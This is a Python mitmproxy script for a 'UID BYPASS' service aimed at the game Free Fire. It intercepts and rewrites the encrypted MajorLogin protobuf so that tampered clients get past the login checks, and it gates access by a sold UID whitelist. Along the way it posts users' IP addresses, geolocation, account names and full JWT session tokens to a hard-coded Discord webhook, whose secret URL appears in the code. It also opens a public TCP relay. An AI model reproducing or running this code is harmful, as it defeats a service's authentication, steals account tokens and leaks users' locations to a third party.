from mitmproxy import http
import json
import asyncio
import aiohttp
from src.core.encryption_utils import aes_decrypt, encrypt_api
from src.protobuf.protobuf_utils import get_available_room, CrEaTe_ProTo
from src.database.mongo_client import MongoDBClient
from src.utils.console import Console
from mitmproxy.tools.main import mitmdump
import copy
import time
import os
import sys
import threading
import re
import requests as req_lib
import sqlite3
import socket

# Correct path logic: Ensure 'src' folder inside 'b_prx' is findable
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

DISCORD_WEBHOOK_URL1 = "yF6ao3wxEak7RLRBQEIEngEhAO9QCYR-r0SoA-9z6sQd8oFDBF1tW4Q"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1336336585142177893/yF6ao3wxEak7RLRBQEIEngEhAO9QCYR-r0SoA-9z6sQd8oFDBF1tW4Q"

# MOBILE_PROTO FROM OG SRC (WORKING)
MOBILE_PROTO = "0468512a81d06e0ff5039596b89c98154aa656bbf25ff337c4326013df4b7992af4490a4005421597775a5ecb545340f63dadfb15a389f2ad78304a06633c6e48ce093dc1333889ea763e6f16d564996963c92c49ec443f5b2482bd2c95013cc"

def init_template():
    try:
        dec_bytes = aes_decrypt(MOBILE_PROTO)
        return json.loads(get_available_room(dec_bytes.hex()))
    except: return {}

proto_template = init_template()

# ══════════════════════════════════════════════════════════════
# REMOTE UID SERVER CONFIG
# ══════════════════════════════════════════════════════════════
UID_SERVERS = {
    "MAIN":   "https://raw.githubusercontent.com/UIDBYPASS/uidbypass/main/uidbypass/raw/uid",
    "BACKUP": "https://raw.githubusercontent.com/UIDBYPASS/uidbypass/main/uidbypass/raw/uid",
}

# ══════════════════════════════════════════════════════════════
# SQLITE DATABASE SETUP
# ══════════════════════════════════════════════════════════════
DB_FILE = "bot_data.db"
db = sqlite3.connect(DB_FILE, check_same_thread=False)
cur = db.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS whitelist (uid TEXT PRIMARY KEY, region TEXT DEFAULT 'GLOBAL')")
cur.execute("CREATE TABLE IF NOT EXISTS blacklist (uid TEXT PRIMARY KEY)")
cur.execute("""
CREATE TABLE IF NOT EXISTS login_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT, uid TEXT, ip TEXT, 
    country TEXT, region TEXT, city TEXT, ts INTEGER, status TEXT
)
""")
cur.execute("CREATE TABLE IF NOT EXISTS stats (key TEXT PRIMARY KEY, value INTEGER)")
db.commit()

for k in ("total", "allowed", "blocked"):
    cur.execute("INSERT OR IGNORE INTO stats (key, value) VALUES (?, ?)", (k, 0))
db.commit()

def inc_stat(name: str):
    cur.execute("UPDATE stats SET value = value + 1 WHERE key=?", (name,))
    db.commit()

def log_login_db(uid, ip, country, region, city, status):
    ts = int(time.time())
    cur.execute("INSERT INTO login_logs (uid, ip, country, region, city, ts, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (uid, ip, country, region, city, ts, status))
    db.commit()

def lookup_geo(ip):
    if not ip or ip == "127.0.0.1": return "Local", "Local", "Local"
    try:
        r = req_lib.get(f"http://ip-api.com/json/{ip}", timeout=5, proxies={"http": None, "https": None})
        j = r.json()
        return j.get("country", "Unknown"), j.get("regionName", "Unknown"), j.get("city", "Unknown")
    except: return "Unknown", "Unknown", "Unknown"

def checkSubscription(uid: str) -> dict:
    uid = str(uid).strip()
    cur.execute("SELECT 1 FROM blacklist WHERE uid=?", (uid,))
    if cur.fetchone(): return {"valid": False, "reason": "blacklisted"}
    
    try:
        cur.execute("SELECT region, expires_at FROM whitelist WHERE uid=?", (uid,))
        row = cur.fetchone()
        if row:
            region, expires_at = row
            if expires_at and expires_at > 0:
                if int(time.time()) > expires_at:
                    return {"valid": False, "reason": "expired"}
            return {"valid": True, "reason": "local_whitelist", "expiry_date": expires_at or "LIFETIME"}
    except sqlite3.OperationalError:
        cur.execute("SELECT region FROM whitelist WHERE uid=?", (uid,))
        row = cur.fetchone()
        if row: return {"valid": True, "reason": "local_whitelist", "expiry_date": "LIFETIME"}
    for name, url in UID_SERVERS.items():
        try:
            r = req_lib.get(url, timeout=5, proxies={"http": None, "https": None})
            if r.status_code == 200:
                for line in r.text.splitlines():
                    match = re.search(r'(\d{8,})', line)
                    if match and match.group(1) == uid:
                        return {"valid": True, "reason": "remote_whitelist", "expiry_date": "LIFETIME"}
        except: continue
    global mongo_client
    try:
        if mongo_client is None: mongo_client = MongoDBClient()
        return mongo_client.check_subscription(uid)
    except: return {"valid": False, "reason": "db_error"}

def send_to_discord(uid, status, ip, country, city, reason, jwt_data=None):
    try:
        color = 0x2ecc71 if status in ["ALLOWED", "TOKEN_ACCESS"] else 0xe74c3c
        fields = [
            {"name": "UID", "value": f"`{uid or 'N/A'}`", "inline": True},
            {"name": "Status", "value": f"`{status}` ({reason or 'N/A'})", "inline": True},
            {"name": "IP Address", "value": f"`{ip or 'Unknown'}`", "inline": False},
            {"name": "Location", "value": f"🌍 {city or 'Unknown'}, {country or 'Unknown'}", "inline": False},
        ]
        
        if jwt_data:
            fields.append({"name": "Nickname", "value": f"`{jwt_data.get('account_name', 'N/A')}`", "inline": True})
            fields.append({"name": "Account ID", "value": f"`{jwt_data.get('account_id', 'N/A')}`", "inline": True})
            fields.append({"name": "Region", "value": f"`{jwt_data.get('region', 'N/A')}`", "inline": True})
            if jwt_data.get("token"):
                fields.append({"name": "JWT Token", "value": f"```jwt\n{jwt_data.get('token')}```", "inline": False})

        embed = {
            "title": f"UID BYPASS - Login {status}",
            "color": color,
            "fields": fields,
            "footer": {"text": "UID BYPASS PRIVATE SYSTEM"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime())
        }
        if "http" in DISCORD_WEBHOOK_URL: req_lib.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=3)
        if "http" in DISCORD_WEBHOOK_URL1: req_lib.post(DISCORD_WEBHOOK_URL1, json={"embeds": [embed]}, timeout=3)
    except: pass

class MajorLoginInterceptor:
    def request(self, flow: http.HTTPFlow) -> None:
        req = flow.request
        
        # --- WEB PANEL ROUTING (NO INFINITE LOOPS) ---
        if req.host == "127.0.0.1" or req.host == "localhost":
            pass
        else:
            admin_routes = ["/", "/dashboard", "/login", "/logout", "/add_uid", "/remove_uid", "/static", "/favicon.ico", "/api"]
            if any(req.path == r or req.path.startswith(r + "/") or req.path.startswith(r + "?") for r in admin_routes):
                if "freefire" not in req.host.lower() and "garena" not in req.host.lower():
                    req.host = "127.0.0.1"
                    req.port = 5000
                    req.scheme = "http"
                    if "Host" in req.headers:
                        req.headers["Host"] = "127.0.0.1:5000"
                    return
        # ---------------------------------------------

        # URL Logging
        print(f"\033[1;32m[{req.method}]\033[0m \033[1;34m{req.host}\033[0m{req.path} \033[90m-> {req.pretty_url}\033[0m", flush=True)

        if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
            try:
                request_hex = flow.request.content.hex()
                dec_bytes = aes_decrypt(request_hex)
                proto_fields = json.loads(get_available_room(dec_bytes.hex()))

                width = Console.get_width()
                print("\n" + Console.GRAY + "─" * width + Console.RESET, flush=True)
                Console.request("/MajorLogin", "POST")
                print(Console.GRAY + "─" * width + Console.RESET, flush=True)
                Console.info("Intercepted encrypted protobuf payload")
                print(f"         ├─ bytes: {len(flow.request.content)}", flush=True)

                uid = None
                version_field = None
                access_token = None
                open_id = None
                main_active_platform = None
                current_timestamp = None
                game_name = None
                native_lib_path = None
                apk_signature_info = None
                client_variant = None

                # Extractions
                for field_num in ["1", "2", "3"]:
                    if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                        potential_uid = str(proto_fields[field_num]["data"])
                        if potential_uid.isdigit() and len(potential_uid) > 5:
                            uid = potential_uid; break
                
                if "3" in proto_fields: current_timestamp = str(proto_fields["3"].get("data", ""))
                if "4" in proto_fields: game_name = str(proto_fields["4"].get("data", ""))
                if "7" in proto_fields: version_field = str(proto_fields["7"].get("data", ""))
                if "29" in proto_fields: access_token = str(proto_fields["29"].get("data", ""))
                if "22" in proto_fields: open_id = str(proto_fields["22"].get("data", ""))
                if "74" in proto_fields: native_lib_path = str(proto_fields["74"].get("data", ""))
                if "77" in proto_fields: apk_signature_info = str(proto_fields["77"].get("data", ""))
                if "93" in proto_fields: client_variant = str(proto_fields["93"].get("data", ""))
                
                if "99" in proto_fields: main_active_platform = str(proto_fields["99"].get("data", ""))
                elif "100" in proto_fields: main_active_platform = str(proto_fields["100"].get("data", ""))

                Console.divider("DECODED PROTOBUF PAYLOAD")
                Console.proto_field("1-3", "user_id", uid or "NULL")
                Console.proto_field("29", "oauth_token", access_token)
                Console.proto_field("22", "open_id", open_id)
                Console.proto_field("99", "platform_id", main_active_platform)
                Console.proto_field("3", "timestamp", current_timestamp)
                Console.proto_field("4", "app_name", game_name)
                Console.proto_field("7", "app_version", version_field)
                Console.proto_field("74", "native_lib_path", native_lib_path)
                Console.proto_field("77", "apk_signature", apk_signature_info)
                Console.proto_field("93", "client_variant", client_variant)

                # JWT Fetching
                jwt_data = None
                if access_token:
                    try:
                        jwt_res = req_lib.get(f"http://127.0.0.1:1080/access-jwt?access_token={access_token}", timeout=10)
                        if jwt_res.status_code == 200:
                            jwt_data = jwt_res.json()
                            if jwt_data.get("status") == "success":
                                Console.success(f"JWT Access: {jwt_data.get('account_name')} ({jwt_data.get('account_id')})")
                                if jwt_data.get("open_id"): open_id = jwt_data.get("open_id")
                                send_to_discord(uid, "TOKEN_ACCESS", "Intercepted", "Intercepted", "Intercepted", "JWT_API", jwt_data)
                    except: pass

                Console.divider("PROTOBUF MUTATION")
                Console.info("Injecting modified fields into protobuf template")
                modified_proto = copy.deepcopy(proto_template)
                
                mutation_fields = [
                    ("3", "timestamp", current_timestamp),
                    ("4", "app_name", game_name),
                    ("7", "app_version", version_field),
                    ("29", "oauth_token", access_token),
                    ("22", "open_id", open_id),
                    ("74", "native_lib_path", native_lib_path),
                    ("77", "apk_signature_info", apk_signature_info),
                    ("93", "client_variant", client_variant)
                ]

                for f, label, val in mutation_fields:
                    if f in modified_proto and val:
                        modified_proto[f]["data"] = val
                        Console.mutation(f"Field[{f}]", f"{label}={val}")
                
                if main_active_platform:
                    for f in ["99", "100"]:
                        if f in modified_proto: modified_proto[f]["data"] = int(main_active_platform)
                        else: modified_proto[f] = {"wire_type": "varint", "data": int(main_active_platform)}
                    Console.mutation("Field[99/100]", f"platform_id={main_active_platform}")

                proto_bytes = CrEaTe_ProTo(modified_proto)
                hex_data = encrypt_api(proto_bytes)
                flow.request.content = bytes.fromhex(hex_data)
                
                Console.success("Request payload encrypted and injected")
                print(f"         ├─ bytes: {len(flow.request.content)}", flush=True)
            except Exception as e:
                Console.error("Request mutation failed", exception=str(e))

    def response(self, flow: http.HTTPFlow) -> None:
        if flow.request.method.upper() == "POST" and "majorlogin" in flow.request.path.lower():
            try:
                proto_fields = json.loads(get_available_room(flow.response.content.hex()))
                inc_stat("total")

                uid_from_response = None
                for field_num in ["1", "2", "3"]:
                    if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                        raw_val = str(proto_fields[field_num]["data"])
                        match = re.search(r'(\d{8,})', raw_val)
                        if match: uid_from_response = match.group(1); break
                
                if uid_from_response:
                    print(f"Found UID in response field 1: {uid_from_response}", flush=True)
                    client_ip = None
                    try: client_ip = flow.client_conn.peername[0]
                    except: pass
                    country, region_name, city = lookup_geo(client_ip)

                    subscription = checkSubscription(uid_from_response)
                    if not subscription["valid"]:
                        inc_stat("blocked")
                        log_login_db(uid_from_response, client_ip, country, region_name, city, f"BLOCKED ({subscription.get('reason')})")
                        Console.error(f"UID {uid_from_response} BLOCKED", reason=subscription.get('reason'), city=city)
                        send_to_discord(uid_from_response, "BLOCKED", client_ip, country, city, subscription.get('reason'))

                        message = (
                            f"[d4a7aa]\nUID BYPASS ACCESS DENIED\n\n"
                            f"[FFFFFF]Your UID [FF0000]{uid_from_response}[FFFFFF] is not authorized.\n"
                            f"[FFFFFF]Reason: [FF0000]{subscription.get('reason', 'Unauthorized')}[FFFFFF]\n\n"
                            f"[FFFFFF]Please contact support for access.\n[d4a7aa] "
                        )
                        flow.response.content = message.encode(); flow.response.status_code = 400
                    else:
                        inc_stat("allowed")
                        log_login_db(uid_from_response, client_ip, country, region_name, city, f"ALLOWED ({subscription.get('reason')})")
                        Console.success(f"UID {uid_from_response} AUTHORIZED", source=subscription.get('reason'), city=city)
                        send_to_discord(uid_from_response, "ALLOWED", client_ip, country, city, subscription.get('reason'))
            except Exception as e: print(f"Response error: {e}", flush=True)

addons = [MajorLoginInterceptor()]
mongo_client = None

# TCP CONTROLLER
async def handle_tcp(reader, writer):
    from core._sock import SockHandler
    client = SockHandler(reader, writer)
    try:
        ip, port = await client.read_preamble()
        if ip and port:
            r_reader, r_writer = await asyncio.open_connection(ip, port)
            remote = SockHandler(r_reader, r_writer)
            await asyncio.gather(client.pipe(remote), remote.pipe(client), return_exceptions=True)
    except: pass
    finally: await client.close()

def start_tcp():
    async def _run():
        try:
            server = await asyncio.start_server(handle_tcp, '0.0.0.0', 19112)
            async with server: await server.serve_forever()
        except: pass
    threading.Thread(target=lambda: asyncio.run(_run()), daemon=True).start()

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

if __name__ == "__main__":
    import subprocess
    
    # 1. Start Services
    start_tcp()
    subprocess.Popen([sys.executable, os.path.join(BASE_DIR, "access_jwt", "app.py")], 
                     cwd=BASE_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Start Admin Panel
    subprocess.Popen([sys.executable, os.path.join(BASE_DIR, "admin_panel.py")], 
                     cwd=BASE_DIR)
    
    # 2. FIXED DISPLAY (SAFE WIDTH)
    Console.divider("FRX BYPASS — STARTING ALL SERVICES")
    Console.success("Service 1 : mitmproxy      → port 8080 (login interceptor)")
    Console.success("Service 2 : TCP Controller   → port 19112 (DLL raw traffic)")
    Console.success("Service 3 : JWT API          → port 1080 (JWT utility)")
    Console.success("Service 4 : Admin Panel      → port 5000 (web interface)")
    Console.info("Platform  : 3 (Garena Android)")
    Console.info("Method    : my_pb2 real-proto (JWT approach)")
    Console.divider()
    
    Console.success("TCP Controller thread started (port 19112)")
    Console.success("JWT API thread started (port 1080)")
    Console.success("Admin Panel started (port 5000)")
    Console.success("mitmproxy started (port 8080)")
    
    # Static Width Centered Box
    w = 80
    t1 = "▸ ALL SERVICES RUNNING ▸"
    t2 = "▸ UID BYPASS TCP CONTROL CENTER ▸"
    print(f"\n{Console.GRAY}╭{'─' * (w-2)}╮{Console.RESET}", flush=True)
    print(f"{Console.GRAY}│{Console.RESET}{' ' * ((w-2-len(t1))//2)}{Console.CYAN}{Console.BOLD}{t1}{Console.RESET}{' ' * (w-2-len(t1)-((w-2-len(t1))//2))}{Console.GRAY}│{Console.RESET}", flush=True)
    print(f"{Console.GRAY}│{Console.RESET}{' ' * ((w-2-len(t2))//2)}{Console.CYAN}{Console.BOLD}{t2}{Console.RESET}{' ' * (w-2-len(t2)-((w-2-len(t2))//2))}{Console.GRAY}│{Console.RESET}", flush=True)
    print(f"{Console.GRAY}╰{'─' * (w-2)}╯{Console.RESET}", flush=True)
    
    print(f"{Console.GRAY}├{'─' * (w-2)}┤{Console.RESET}", flush=True)
    Console.success("Server Status: ONLINE")
    Console.info("Listening on : 0.0.0.0:19112")
    Console.info("Ready for DLL Redirections...")
    
    try:
        # Automatically detect the Wispbyte port
        proxy_port = os.environ.get("SERVER_PORT", "8080")
        mitmdump(["-s", __file__, "--listen-host", "0.0.0.0", "-p", str(proxy_port), "--set", "block_global=false"])
    except KeyboardInterrupt: pass
    except Exception as e:
        print(f"\n{Console.RED}[CRITICAL ERROR] mitmproxy failed: {e}{Console.RESET}")
        time.sleep(10)
